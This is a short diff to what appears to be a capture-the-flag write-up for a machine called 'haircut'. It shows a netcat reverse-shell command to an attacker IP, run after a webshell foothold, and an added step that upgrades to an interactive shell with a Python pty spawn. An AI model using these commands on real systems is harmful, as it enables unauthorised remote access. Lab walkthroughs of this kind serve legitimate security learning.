@@ -151,3 +151,9 @@ The webshell allows the user to execute in a shell. Connect to the attacker as f
 ```
 nc $IP_ATTACKER 4444 -e /bin/bash
 ```
+
+Upgrade shell to more interactive one:
+```
+python3 -c "import pty; pty.spawn('/bin/bash');"
+www-data@haircut:/tmp$
+```
